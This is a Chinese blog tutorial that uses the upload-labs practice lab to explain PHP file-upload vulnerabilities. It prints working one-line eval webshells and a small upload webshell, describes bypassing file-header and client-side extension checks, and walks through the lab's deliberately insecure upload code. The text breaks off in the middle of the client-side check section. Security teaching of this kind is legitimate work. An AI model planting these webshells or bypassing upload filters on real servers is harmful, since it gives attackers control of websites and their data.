<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>在 PHP 语言下的文件上传漏洞 | Ed3n's Blog</title><meta name="author" content="Ed3n"><meta name="copyright" content="Ed3n"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="文件上传webshell认识 WebShellwebshell 概念Webshell 是黑客经常使用的一种恶意脚本，其目的是获得服务器的执行操作权限，以 aspx、php、jsp 等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。  常见的后端开发语言主要有 Java、.net、php，而 WebShell 就是 jsp、aspx、php等网页文件形式存在的一种命令、代码执行环境">
<meta property="og:type" content="article">
<meta property="og:title" content="在 PHP 语言下的文件上传漏洞">
<meta property="og:url" content="http://example.com/2024/04/02/PHP%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="Ed3n&#39;s Blog">
<meta property="og:description" content="文件上传webshell认识 WebShellwebshell 概念Webshell 是黑客经常使用的一种恶意脚本，其目的是获得服务器的执行操作权限，以 aspx、php、jsp 等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。  常见的后端开发语言主要有 Java、.net、php，而 WebShell 就是 jsp、aspx、php等网页文件形式存在的一种命令、代码执行环境">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/avatar.jpg">
<meta property="article:published_time" content="2024-04-01T16:00:00.000Z">
<meta property="article:modified_time" content="2024-08-09T11:39:30.610Z">
<meta property="article:author" content="Ed3n">
<meta property="article:tag" content="PHP">
<meta property="article:tag" content="文件上传">
<meta property="article:tag" content="upload -labs">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/avatar.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/04/02/PHP%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":-1,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '在 PHP 语言下的文件上传漏洞',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-08-09 19:39:30'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load',() => { preloader.endLoading() })

  if (false) {
    document.addEventListener('pjax:send', () => { preloader.initLoading() })
    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
  }
})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2024/03/16/lDdKRUXWtLcZJP8.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Ed3n's Blog"><span class="site-name">Ed3n's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">在 PHP 语言下的文件上传漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-04-01T16:00:00.000Z" title="发表于 2024-04-02 00:00:00">2024-04-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-08-09T11:39:30.610Z" title="更新于 2024-08-09 19:39:30">2024-08-09</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PHP/">PHP</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">10k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>40分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="在 PHP 语言下的文件上传漏洞"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><h3 id="认识-WebShell"><a href="#认识-WebShell" class="headerlink" title="认识 WebShell"></a>认识 WebShell</h3><h4 id="webshell-概念"><a href="#webshell-概念" class="headerlink" title="webshell 概念"></a>webshell 概念</h4><p>Webshell 是黑客经常使用的一种恶意脚本，其目的是获得服务器的执行操作权限，以 aspx、php、jsp 等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。 </p>
<p>常见的后端开发语言主要有 Java、.net、php，而 WebShell 就是 jsp、aspx、php等网页文件形式存在的一种命令、代码执行环境，也可以将其称做为一种网页木马后门。</p>
<p>黑客在入侵了一个网站后，通常会将 jsp、aspx 或 php 后门文件与网站服务器 WEB 目录下正常的网页文件混在一起。然后就可以使用浏览 器来访问后门文件，得到一个命令执行环境，以达到控制网站服务器的目的。</p>
<h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><p>可以穿越防火墙，由于与被控制的服务器或远程主机交换的数据都是通过 http&#x2F;https 协议（默认 80、443 端口）传递的，因此不会被防火墙拦截。</p>
<p>使用 WebShell 一般不会在系统日志中留下记录，只会在网站的 web 日志（比如 apache 的 access.log）中留下一些数据提交记录，没有经验的管理员是很难看出入侵痕迹的。</p>
<h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>WebShell 根据编程语言可以分为 php 木马、aspx 木马和 jsp 木马（跟随时代和技术的发展，现在也用 python 编写的脚本木马）。</p>
<p>按照文件大小和功能可以分为3种：大马，小马，一句话木马，具体使用场景和特点如下图：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/308e96b97ed0565eed3578de869914df.png" alt="image-20240506123157080"></p>
<h5 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h5><p>代码简短，通常只有一行代码，使用方便。</p>
<p>比如 PHP 木马：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span>(<span class="number">123</span>); @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span>(<span class="number">123</span>); @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中 GET、POST 表示客户端向服务端传递参数的两种种方式，一句话木马用<code> $_GET[&#39; &#39;]</code>或者<code>$_POST[&#39; &#39;]</code>接收攻击者传递的数据，并把接收的数据传递给一句话木马中执行命令的函数（<code>eval()</code>，<code>assert()</code>等），进而执行命令。</p>
<p><code>echo(123);</code> 是用来检测木马是否成功运行。</p>
<p>当将 <code>@</code>放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。</p>
<p><code>eval()</code> 就是执行命令的函数，<code>$_POST[&#39; &#39;]</code> 就是接收的数据，<code>eval()</code> 函数把接收的数据当作 PHP 代码来执行。这样攻击者就能够让插入了一句话木马的网站执行传递过去的任意 PHP 语句，包括系统命令。</p>
<p>比如：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">cmd = <span class="built_in">cat</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h5 id="小马"><a href="#小马" class="headerlink" title="小马"></a>小马</h5><p>只包含文件上传功能，体积小的木马。</p>
<p>比如上传任意文件的木马：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="variable">$temp</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">@<span class="variable">$file</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;form action=&#x27;&#x27; method=&#x27;POST&#x27; ENCTYPE=&#x27;multipart/form-data&#x27;&gt;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;local file:&lt;input type=&#x27;file&#x27; name=&#x27;upload_file&#x27;&gt;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;input type=&#x27;submit&#x27; value=&#x27;Upload&#x27;&gt;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/form&gt;\n&lt;pre&gt;\n\n&lt;/pre&gt;&quot;</span>; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;successfully.&lt;p&gt;\n&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;unable to uplaod&quot;</span> . <span class="variable">$file</span> . <span class="string">&quot;.&lt;p&gt;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="大马"><a href="#大马" class="headerlink" title="大马"></a>大马</h5><p>体积大，包含很多功能，代码通常会进行加密隐藏，一般需要连接密码。</p>
<h2 id="认识文件上传"><a href="#认识文件上传" class="headerlink" title="认识文件上传"></a>认识文件上传</h2><p><strong>文件上传</strong></p>
<p>就是将客户端的文件上传到服务器的过程。 </p>
<p>比如 QQ 空间发表说说上传的图片、招聘网上传简历、将文件上传到网盘等，这些都是文件上传。</p>
<p><strong>文件上传漏洞</strong></p>
<p>上传文件的时候，如果服务器端、后端未对上传的文件进行严格的验证和过滤，就可能造成上传恶意文件的情况，造成文件上传漏洞。 </p>
<p>常见场景是 web 服务器允许用户上传图片或者普通文本文件保存，而攻击者绕过上传机制上传恶意代码文件并执行从而控制服务器。</p>
<p>这个恶意的代码文件（ php、asp、aspx、jsp 等）就是 webshell。 </p>
<p>危害：攻击者通过上传恶意文件传递给解释器去执行，然后就可以在服务器上执行恶意代码，进行数据库执行、服务器文件管理、命令执行等恶意操作。从而控制整个网站，甚至是服务器。</p>
<p><strong>条件</strong>：</p>
<p>能上传 webshell </p>
<p>webshell 路径可知 </p>
<p>webshell 可以被访问</p>
<p>webshell 可以被解析</p>
<h2 id="PHP-实现文件上传的代码基础"><a href="#PHP-实现文件上传的代码基础" class="headerlink" title="PHP 实现文件上传的代码基础"></a>PHP 实现文件上传的代码基础</h2><p>以 upload-labs Pass-01 的关键源码为例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../head.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;../menu.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ol>
<li><p>首先引入了两个文件 <code>config.php</code> 和 <code>head.php</code>、<code>menu.php</code>。这些文件包含了一些全局配置和页面模板。</p>
</li>
<li><p>初始化了两个变量 <code>$is_upload</code> 和 <code>$msg</code>。<code>$is_upload</code> 用于标记文件是否上传成功，<code>$msg</code> 用于存储错误信息。</p>
</li>
<li><p>当用户提交表单（<code>isset($_POST[&#39;submit&#39;])</code>）时，开始进行文件上传的处理。</p>
</li>
<li><p>首先检查 <code>UPLOAD_PATH</code> 是否存在。</p>
<p><code>UPLOAD_PATH</code> 是一个常量，它表示文件上传的目录路径。这个常量通常在 <code>config.php</code> 文件中定义。</p>
<p>如果不存在，则将错误信息存储到 <code>$msg</code> 变量中。</p>
<p>该常量同时在下一步构建上传文件的目标路径。上传文件会被保存到 <code>UPLOAD_PATH</code> 指定的目录中，文件名为上传文件的原始文件名。</p>
</li>
<li><p>如果 <code>UPLOAD_PATH</code> 存在，则获取上传文件的临时路径（<code>$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]</code>）和目标路径（<code>UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;]</code>）。</p>
<p>当用户通过表单上传文件时，PHP 会将文件暂时存储在服务器的临时目录中，并将相关信息存储在 <code>$_FILES</code> 超级全局变量中。</p>
<p><code>$_FILES</code> 变量是一个二维数组，其中包含了上传文件的各种信息，如文件名、文件类型、文件大小等。</p>
<p><code>$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]</code> 就是其中的一个元素，它存储了上传文件的临时存储路径。这个临时路径是 PHP 自动生成的，用于在将文件移动到最终存储位置之前保存文件。</p>
<p>其中 <code>&#39;upload_file&#39;</code> 就是表单中 <code>&lt;input class=&quot;input_file&quot; type=&quot;file&quot; name=&quot;upload_file&quot;/&gt;</code> 中的 <code>name</code> 属性值。</p>
<p>而 <code>&#39;tmp_name&#39;</code> 就是 <code>$_FILES</code> 数组中的一个键，用于表示上传文件的临时存储路径。</p>
<p>使用 <code>$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]</code> 来获取上传文件的临时路径，然后将其移动到 <code>UPLOAD_PATH</code> 指定的目录中，完成文件的上传过程。</p>
<p><code>&#39;name&#39;</code> 是 <code>$_FILES</code> 数组中的另一个键，对应的是上传文件的原始文件名。</p>
<p><code>$_FILES[&#39;upload_file&#39;][&#39;name&#39;]</code> 就是用于获取上传文件的原始文件名。这个文件名是用户在本地计算机上选择的文件名，在上传到服务器时保留了下来。</p>
<p>这里是<code>$_FILES</code>中的那些参数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_FILES</span> 这个变量用与上传的文件参数设置，是一个多维数组</span><br><span class="line">数组的用法就是 <span class="variable">$_FILES</span>[<span class="string">&#x27;key&#x27;</span>][<span class="string">&#x27;key2&#x27;</span>];</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>] 是你表单上传的文件信息数组，upfile 是文件上传字段，在上传时由服务器根据上传字段设定</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>] 包含了以下内容：</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] 客户端文件的原名称</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如 <span class="string">&quot;image/gif&quot;</span></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] 已上传文件的大小，单位为字节</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>] 文件被上传后在服务端储存的临时文件名</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] 和该文件上传相关的错误代码</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用 <code>move_uploaded_file()</code> 函数将临时文件移动到目标路径。如果移动成功，则将 <code>$is_upload</code> 设置为 <code>true</code>，否则将错误信息存储到 <code>$msg</code> 变量中。</p>
</li>
</ol>
<h2 id="文件检测机制与绕过方式"><a href="#文件检测机制与绕过方式" class="headerlink" title="文件检测机制与绕过方式"></a>文件检测机制与绕过方式</h2><p>大多数网站都存在文件检测机制，不会允许任意文件上传。常见的文件检测方式有：</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/11e8d6792e16338afbf2867932ebe56f.png" alt="image-20240506124945474"></p>
<h3 id="文件头检测"><a href="#文件头检测" class="headerlink" title="文件头检测"></a>文件头检测</h3><p>一般来说，给 webshell 添加文件头就可以绕过</p>
<p>文件头可以将文件拖入 010 editor 后看到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF : GIF89a </span><br><span class="line">png : %PNG....</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/img_convert/38aedcd27f0cb1b41bdd00c790c75ec2.png" alt="image-20231019204923063"></p>
<h3 id="客户端检测"><a href="#客户端检测" class="headerlink" title="客户端检测"></a>客户端检测</h3><p>客户端检测一般是在网页上写一段 javascript 脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。</p>
<p>判断方式：在浏览加载文件，点击上传按钮时便弹出对话框，内容如：只允许上传 .jpg &#x2F; .jpeg &#x2F; .png 后缀名的文件，而此时并没有发送数据包。</p>
<h4 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h4><p>upload-labs Pass-01：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 定义允许上传的文件类型</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 提取上传文件的类型</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 判断上传文件类型是否允许上传</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name) == -<span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(errMsg);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ol>
<li><p>这段 JavaScript 代码定义了 checkFile 函数</p>
</li>
<li><p><code>var file = document.getElementsByName(&#39;upload_file&#39;)[0].value;</code></p>
<p>获取表单中 <code>&lt;input type=&quot;file&quot; name=&quot;upload_file&quot;&gt;</code> 元素的值，也就是用户选择的文件路径。</p>
<p><code>document.getElementsByName(&#39;upload_file&#39;)</code> 这个方法用于根据元素的 <code>name</code> 属性获取匹配的元素集合。它会获取所有 <code>name</code> 属性为 <code>&#39;upload_file&#39;</code> 的 <code>&lt;input&gt;</code> 元素。所以返回的是一个 HTML 集合，此时需要通过索引来访问具体的元素。<code>[0]</code> 表示获取集合中的第一个元素。</p>
<p><code>.value</code> 这个属性用于获取表单控件的值。对于 <code>&lt;input type=&quot;file&quot;&gt;</code> 元素来说，它就是文件路径。</p>
</li>
<li><p><code>if (file == null || file == &quot;&quot;)</code></p>
<p>这个条件判断用于检查用户是否选择了文件。如果 <code>file</code> 变量为 <code>null</code> 或空字符串 <code>&quot;&quot;</code>，说明用户没有上传文件。如果条件成立，则弹出警告框提示用户上传文件，并返回 <code>false</code> 阻止表单提交。</p>
</li>
<li><p><code>var allow_ext = &quot;.jpg|.png|.gif&quot;;</code></p>
<p>定义了允许上传的文件类型，包括 <code>.jpg</code>、<code>.png</code> 和 <code>.gif</code>。</p>
</li>
<li><p><code>var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));</code></p>
<p>提取上传文件的扩展名。</p>
<p><code>lastIndexOf(&quot;.&quot;)</code> 提取 file 变量中 <code>.</code> 首次出现的位置（返回一个数字）</p>
<p>使用 <code>substring()</code> 方法从文件路径中获取最后一个点 <code>.</code> 之后的部分，即文件的扩展名。</p>
</li>
<li><p><code>if (allow_ext.indexOf(ext_name) == -1)</code> 这个条件判断用于检查上传文件的扩展名是否在允许的扩展名列表中。</p>
